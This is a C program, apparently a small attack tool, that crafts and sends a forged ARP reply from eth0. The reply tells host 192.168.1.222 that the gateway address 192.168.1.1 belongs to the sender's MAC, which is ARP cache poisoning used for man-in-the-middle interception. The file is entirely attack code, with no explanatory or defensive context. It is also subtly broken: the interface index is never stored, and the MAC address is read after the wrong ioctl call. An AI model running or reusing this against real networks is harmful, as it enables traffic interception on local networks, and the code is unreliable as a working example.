#include "yamorn.h"

#define BUF_SIZ 42
#define DEVICE "eth0"

int sockfd;
unsigned char buf[BUF_SIZ];
unsigned char s_mac[6];
unsigned char t_mac[6]={0x00, 0x0c, 0x29, 0x99, 0xa6, 0x22};
unsigned char t_ip[4] = {192, 168, 1, 222};
unsigned char s_ip[4] = {192, 168, 1, 1};

struct arp_packet{
    struct ether_header eh;
    struct ether_arp arp;
};


int main(int argc, char **argv[]){
    struct  arp_packet *arpkt;
    bzero(&buf, BUF_SIZ);
    arpkt = (struct arp_packet *)buf;

    struct ifreq ifrq;
    struct sockaddr_ll slladdr;
    int ifindex;
    int yes = 1;
    int i;
    ssize_t length;
    char macaddr[50];

    sockfd = Socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    strncpy(ifrq.ifr_name, DEVICE, strlen(DEVICE) + 1);
    if(ioctl(sockfd, SIOCGIFINDEX, &ifrq) < 0){
        perror("ioctl");
        exit(1);
    }
    for(i = 0; i < 6; i++){
        s_mac[i] = ifrq.ifr_hwaddr.sa_data[i];
    }
    slladdr.sll_family = AF_PACKET;
    slladdr.sll_protocol = htons(ETH_P_ARP);
    slladdr.sll_ifindex = ifindex;
    slladdr.sll_hatype = htons(ARPHRD_ETHER);
    slladdr.sll_pkttype = htons(PACKET_OTHERHOST);
    slladdr.sll_halen = 8;
    slladdr.sll_addr[6] = 0x00;
    slladdr.sll_addr[7] = 0x00;

    memcpy(arpkt->eh.ether_shost, s_mac, 6);
    memcpy(arpkt->eh.ether_dhost, t_mac, 6);
    arpkt->eh.ether_type = htons(ETH_P_ARP);
    arpkt->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arpkt->arp.ea_hdr.ar_hln = 6;
    arpkt->arp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arpkt->arp.ea_hdr.ar_pln = 4;
    arpkt->arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy(arpkt->arp.arp_sha, s_mac, 6);
    memcpy(arpkt->arp.arp_tha, t_mac, 6);
    memcpy(arpkt->arp.arp_spa, s_ip, 4);
    memcpy(arpkt->arp.arp_tpa, t_ip, 4);

    Sendto(sockfd, buf, BUF_SIZ, 0, (struct sockaddr *)&slladdr, sizeof(slladdr));

    

}







